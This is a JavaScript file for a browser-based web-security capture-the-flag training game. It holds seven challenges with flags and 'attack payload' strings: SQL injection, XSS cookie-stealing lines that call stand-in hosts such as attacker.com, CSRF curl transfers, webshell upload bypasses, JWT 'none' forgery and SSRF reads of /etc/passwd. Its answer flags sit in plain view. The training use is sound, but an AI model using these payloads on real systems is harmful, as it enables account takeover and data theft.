// ===== CTF DATA =====
// ===== CTF DATA =====
const ctfChallenges = [
    {
        id: 1,
        title: "SQL Injection",
        description: "Scenario: DarkWeb Corp's employee portal is vulnerable. The login page has SQL injection vulnerability in the 'Remember me' feature.",
        points: 100,
        flag: "FLAG{SQ1_1nj3ct_4ll_th3_way}",
        hint: "Try ' OR '1'='1' -- as username (password can be anything)",
        command: "sqlmap -u 'http://darkweb-corp.com/login' --data='username=*&password=*' --dbs",
        completed: false
    },
    {
        id: 2,
        title: "XSS Attack",
        description: "Scenario: E-commerce site comment section is vulnerable. Admin regularly checks comments. Steal admin cookies using XSS.",
        points: 150,
        flag: "FLAG{X55_cr055_s1t3_scr1pt1ng}",
        hint: "Try: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        command: "<img src=x onerror=\"fetch('http://your-server.com/steal?cookie='+document.cookie)\">",
        completed: false
    },
    {
        id: 3,
        title: "CSRF Token Bypass",
        description: "Scenario: Banking application has fund transfer feature with weak CSRF token validation. Bypass the security.",
        points: 200,
        flag: "FLAG{CSRF_t0k3n_br0k3n}",
        hint: "Remove the 'csrf_token' parameter from POST request or use same token multiple times",
        command: "curl -X POST http://secure-bank.com/transfer -d 'amount=5000&to=attacker_account'",
        completed: false
    },
    {
        id: 4,
        title: "File Upload Bypass",
        description: "Scenario: Social media platform allows only image uploads. Security filter blocks .php files. Find way to upload webshell.",
        points: 250,
        flag: "FLAG{F1l3_upl04d_3xpl01t}",
        hint: "Try double extension: shell.php.jpg or null byte: shell.php%00.jpg",
        command: "shell.php5 or shell.phtml (with GIF magic bytes: GIF89a;)",
        completed: false
    },
    {
        id: 5,
        title: "IDOR Attack",
        description: "Scenario: User profile system exposes sequential user IDs. Access admin profile (ID: 0) to get secret flag.",
        points: 175,
        flag: "FLAG{1d0r_1ns3cur3_d1r3ct_0bj3ct}",
        hint: "Change URL parameter: /api/user/1 → /api/user/0 (admin account)",
        command: "http://vuln-site.com/api/user/1 → Change to /api/user/0",
        completed: false
    },
    {
        id: 6,
        title: "JWT Token Manipulation",
        description: "Scenario: Admin dashboard uses JWT tokens with weak validation. Algorithm 'HS256' is implemented but validation is weak.",
        points: 300,
        flag: "FLAG{JWT_n0ne_alg0r1thm}",
        hint: "Change algorithm to 'none' in JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        command: "Change JWT from: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
        completed: false
    },
    {
        id: 7,
        title: "SSRF Attack",
        description: "Scenario: Image fetching service allows URL input. Server internal network is accessible. Read /etc/passwd from internal server.",
        points: 350,
        flag: "FLAG{55rf_1nt3rn4l_n3tw0rk}",
        hint: "Use URL: http://localhost:8080/admin or file:///etc/passwd or 127.0.0.1:22",
        command: "http://target.com/fetch?url=file:///etc/passwd",
        completed: false
    }
];

// ===== GLOBAL VARIABLES =====
let currentFlag = null;
let score = 0;
let captured = 0;

// ===== DOM ELEMENTS =====
const flagsContainer = document.getElementById('flagsContainer');
const terminal = document.getElementById('terminal');
const output = document.getElementById('output');
const terminalInput = document.getElementById('terminalInput');
const progressFill = document.getElementById('progressFill');
const capturedCount = document.getElementById('capturedCount');
const remainingCount = document.getElementById('remainingCount');
const scoreElement = document.getElementById('score');
const closeTerminalBtn = document.getElementById('closeTerminalBtn');
const resetBtn = document.getElementById('resetBtn');

// ===== INITIALIZE =====
document.addEventListener('DOMContentLoaded', function () {
    renderFlags();
    updateProgress();
    setupTerminal();
    setupEventListeners();
    typeWriterEffect();
    initBinaryRain();
});

// ===== EVENT LISTENERS =====
function setupEventListeners() {
    closeTerminalBtn.addEventListener('click', closeTerminal);
    resetBtn.addEventListener('click', resetCTF);
}

// ===== RENDER FLAGS =====
function renderFlags() {
    flagsContainer.innerHTML = '';

    ctfChallenges.forEach(challenge => {
        const card = document.createElement('div');
        card.className = `flag-card ${challenge.completed ? 'completed' : ''}`;
        card.onclick = () => openTerminal(challenge.id);

        card.innerHTML = `
            <span class="flag-number">${challenge.id}</span>
            <h3 class="flag-title">${challenge.title}</h3>
            <span class="flag-points">${challenge.points} pts</span>
            <p class="flag-desc">${challenge.description}</p>
            ${challenge.completed ?
                `<p style="color: var(--success); margin-top: 10px;">✅ Flag Captured: ${challenge.flag}</p>` :
                ''
            }
        `;

        flagsContainer.appendChild(card);
    });
}

// ===== TERMINAL FUNCTIONS =====
function setupTerminal() {
    terminalInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            processCommand(this.value);
            this.value = '';
        }
    });
}

function openTerminal(flagId) {
    currentFlag = ctfChallenges.find(c => c.id === flagId);
    terminal.style.display = 'flex';

    const status = currentFlag.completed ? '✅ CAPTURED' : '🔒 LOCKED';
    const color = currentFlag.completed ? 'var(--success)' : 'var(--accent)';

    output.innerHTML = `
        <div class="terminal-info">
            <div style="color: ${color}; font-weight: bold; margin-bottom: 1rem;">
                ╔══════════════════════════════════════════╗<br>
                ║  MISSION: ${currentFlag.title.padEnd(28)} ║<br>
                ║  STATUS: ${status.padEnd(33)} ║<br>
                ║  REWARD: ${currentFlag.points.toString().padEnd(33)} ║<br>
                ╚══════════════════════════════════════════╝<br>
            </div>
        </div>
    `;

    if (!currentFlag.completed) {
        output.innerHTML += `
            <div class="instruction-box">
                <p>🎯 <strong>Mission Brief:</strong></p>
                <p>${currentFlag.description}</p>
                <p>💻 <strong>Commands Available:</strong></p>
                <p>• Type <code>hint</code> - Get tactical hint</p>
                <p>• Type <code>command</code> - View attack payload</p>
                <p>• Type <code>submit FLAG_HERE</code> - Capture flag</p>
                <p>• Type <code>help</code> - Show all commands</p>
            </div>
        `;
    } else {
        output.innerHTML += `
            <div class="completed-message">
                <p>✅ <strong>Mission Accomplished!</strong></p>
                <p>Captured Intelligence: <code>${currentFlag.flag}</code></p>
                <p>🎖️ This challenge has been marked as completed.</p>
            </div>
        `;
    }

    terminalInput.focus();
}

function closeTerminal() {
    terminal.style.display = 'none';
    currentFlag = null;
}

function processCommand(cmd) {
    if (!currentFlag) {
        addOutput("❌ No mission selected. Click on a challenge first.", "error");
        return;
    }

    if (cmd.toLowerCase() === 'help') {
        showHelp();
    }
    else if (cmd.toLowerCase() === 'hint') {
        showHint();
    }
    else if (cmd.toLowerCase() === 'command') {
        showCommand();
    }
    else if (cmd.toLowerCase() === 'clear') {
        output.innerHTML = '';
    }
    else if (cmd.toLowerCase() === 'status') {
        showStatus();
    }
    else if (cmd.toLowerCase().startsWith('submit ')) {
        submitFlag(cmd.substring(7));
    }
    else {
        addOutput(`❌ Unknown command: "${cmd}". Type 'help' for available commands.`, "error");
    }
}

function showHelp() {
    const helpText = `
        <div class="help-box">
            <p><strong>🛡️ CRYPTSLAYERS COMMANDS:</strong></p>
            <p><code>help</code> - Show this help message</p>
            <p><code>hint</code> - Get tactical hint for current mission</p>
            <p><code>command</code> - View attack payload/exploit</p>
            <p><code>submit FLAG</code> - Submit captured intelligence (e.g., submit FLAG{example})</p>
            <p><code>status</code> - Show your current progress</p>
            <p><code>clear</code> - Clear terminal screen</p>
        </div>
    `;
    addOutput(helpText);
}

function showHint() {
    if (currentFlag.completed) {
        addOutput("✅ Mission already accomplished! No hint needed.", "success");
        return;
    }

    const hintHTML = `
        <div class="hint-box">
            <div class="hint-title">💡 TACTICAL HINT: ${currentFlag.title}</div>
            <div class="hint-content">${currentFlag.hint}</div>
            <div style="margin-top: 0.5rem; font-size: 0.9rem; color: var(--text-secondary);">
                <em>Use this intelligence to complete your mission!</em>
            </div>
        </div>
    `;
    addOutput(hintHTML);
}

function showCommand() {
    if (currentFlag.completed) {
        addOutput("✅ Mission already accomplished!", "success");
        return;
    }

    const commandHTML = `
        <div class="command-box">
            <div style="color: var(--accent); margin-bottom: 0.5rem;">
                ⚡ ATTACK PAYLOAD:
            </div>
            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; border-left: 4px solid var(--accent); font-family: monospace;">
                ${currentFlag.command}
            </div>
            <div style="margin-top: 0.5rem; font-size: 0.9rem; color: var(--text-secondary);">
                <em>This is the exploit payload for penetration testing</em>
            </div>
        </div>
    `;
    addOutput(commandHTML);
}

function showStatus() {
    const statusHTML = `
        <div class="status-box">
            <p>📊 <strong>OPERATION STATUS:</strong></p>
            <p>• Missions Completed: ${captured}/7</p>
            <p>• Total Intelligence Points: ${score}</p>
            <p>• Progress: ${Math.round((captured / 7) * 100)}%</p>
            <p>• Next Mission Value: ${getNextFlagPoints()} points</p>
        </div>
    `;
    addOutput(statusHTML);
}

function submitFlag(submittedFlag) {
    if (currentFlag.completed) {
        addOutput("⚠️ This intelligence has already been captured!", "warning");
        return;
    }

    if (submittedFlag === currentFlag.flag) {
        if (!currentFlag.completed) {
            currentFlag.completed = true;
            score += currentFlag.points;
            captured++;

            updateProgress();
            renderFlags();

            const successHTML = `
                <div class="success-box">
                    <div style="color: var(--success); font-size: 1.5rem; margin-bottom: 1rem;">
                        🎉 MISSION ACCOMPLISHED!
                    </div>
                    <div style="background: rgba(0, 255, 157, 0.1); padding: 1.5rem; border-radius: 10px; border: 2px solid var(--success);">
                        <p><strong>Operation:</strong> ${currentFlag.title}</p>
                        <p><strong>Intelligence Points:</strong> +${currentFlag.points}</p>
                        <p><strong>Captured Intelligence:</strong></p>
                        <div style="font-family: 'Courier New', monospace; font-size: 1.3rem; color: var(--success); margin: 1rem 0; padding: 1rem; background: rgba(0,0,0,0.3); border-radius: 5px;">
                            ${currentFlag.flag}
                        </div>
                        <p><em>Flag has been added to intelligence database!</em></p>
                    </div>
                </div>
            `;
            addOutput(successHTML);

            showConfetti();

            // Check if all flags captured
            if (captured === 7) {
                setTimeout(() => {
                    showCompletionMessage();
                }, 1000);
            }
        } else {
            addOutput("⚠️ Intelligence already captured!", "warning");
        }
    } else {
        addOutput("❌ Incorrect intelligence! Verify and try again.", "error");
    }
}

function addOutput(message, type = "normal") {
    const messageDiv = document.createElement('div');
    messageDiv.className = `output-message ${type}`;
    messageDiv.innerHTML = message;

    output.appendChild(messageDiv);
    scrollTerminalToBottom();
}

function scrollTerminalToBottom() {
    const terminalBody = document.querySelector('.terminal-body');
    if (terminalBody) {
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }
}

// ===== PROGRESS FUNCTIONS =====
function updateProgress() {
    capturedCount.textContent = captured;
    remainingCount.textContent = 7 - captured;
    scoreElement.textContent = score;
    progressFill.style.width = `${(captured / 7) * 100}%`;
}

function getNextFlagPoints() {
    const nextFlag = ctfChallenges.find(c => !c.completed);
    return nextFlag ? nextFlag.points : 0;
}

function resetCTF() {
    if (confirm("⚠️ Are you sure you want to abort all operations? All progress will be lost!")) {
        ctfChallenges.forEach(c => c.completed = false);
        currentFlag = null;
        score = 0;
        captured = 0;
        renderFlags();
        updateProgress();
        output.innerHTML = "✅ All operations reset successfully!<br><br>";
        closeTerminal();
    }
}

// ===== EFFECTS =====
function showConfetti() {
    const colors = ['#00ff41', '#ff00ff', '#00ffff', '#ffff00'];
    for (let i = 0; i < 50; i++) {
        setTimeout(() => {
            const confetti = document.createElement('div');
            confetti.style.position = 'fixed';
            confetti.style.width = '10px';
            confetti.style.height = '10px';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.borderRadius = '50%';
            confetti.style.left = Math.random() * 100 + 'vw';
            confetti.style.top = '-20px';
            confetti.style.zIndex = '9999';
            document.body.appendChild(confetti);

            const animation = confetti.animate([
                { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
                { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
            ], {
                duration: 1000 + Math.random() * 1000,
                easing: 'cubic-bezier(0.215, 0.61, 0.355, 1)'
            });

            animation.onfinish = () => confetti.remove();
        }, i * 50);
    }
}

function typeWriterEffect() {
    const welcomeText = "Type 'help' for operational commands...";
    let i = 0;
    function typeWriter() {
        if (i < welcomeText.length) {
            terminalInput.placeholder = welcomeText.substring(0, i + 1);
            i++;
            setTimeout(typeWriter, 50);
        }
    }
    setTimeout(typeWriter, 1000);
}

// ===== BINARY RAIN BACKGROUND =====
function initBinaryRain() {
    for (let i = 0; i < 60; i++) {
        createBinaryChar(i);
    }
}

function createBinaryChar(index) {
    const char = document.createElement('div');
    char.className = 'binary-char';

    char.textContent = Math.random() > 0.5 ? '0' : '1';

    const left = Math.random() * 100;
    const duration = 2 + Math.random() * 5;
    const delay = Math.random() * 3;
    const fontSize = Math.random() * 8 + 16;
    const opacity = Math.random() * 0.4 + 0.2;

    if (Math.random() > 0.7) {
        char.classList.add('glow');
    }

    char.style.cssText = `
        left: ${left}vw;
        top: -50px;
        animation-duration: ${duration}s;
        animation-delay: ${delay}s;
        font-size: ${fontSize}px;
        color: rgba(255, 59, 125, ${opacity});
        font-weight: ${Math.random() > 0.5 ? '600' : '400'};
        filter: blur(${Math.random() * 0.5}px);
    `;

    document.body.appendChild(char);

    setTimeout(() => {
        if (char.parentNode) {
            char.remove();
            createBinaryChar(index);
        }
    }, (duration + delay) * 1000);
}

function showCompletionMessage() {
    // Record completion in levelManager
    if (window.levelManager) {
        levelManager.completeQuiz('html', 100);
    }

    const completionHTML = `
        <div class="completion-box" style="text-align: center; padding: 2rem; background: linear-gradient(135deg, rgba(255, 59, 125, 0.2), rgba(0, 255, 157, 0.2)); border-radius: 15px; margin: 2rem 0;">
            <div style="font-size: 2.5rem; margin-bottom: 1rem;">🏆</div>
            <div style="font-size: 2rem; color: var(--accent); margin-bottom: 1rem;">OPERATION COMPLETE!</div>
            <div style="font-size: 1.2rem; margin-bottom: 1rem;">🎖️ All 7 missions successfully accomplished!</div>
            <div style="font-size: 1.5rem; color: var(--success); margin-bottom: 1.5rem;">Total Intelligence Points: ${score}</div>
            <div style="font-size: 1rem; color: var(--text-secondary);">
                <p>✅ All web penetration testing challenges completed!</p>
                <p>🛡️ You are now ready for real-world CTF operations!</p>
            </div>
        </div>
    `;
    addOutput(completionHTML);
}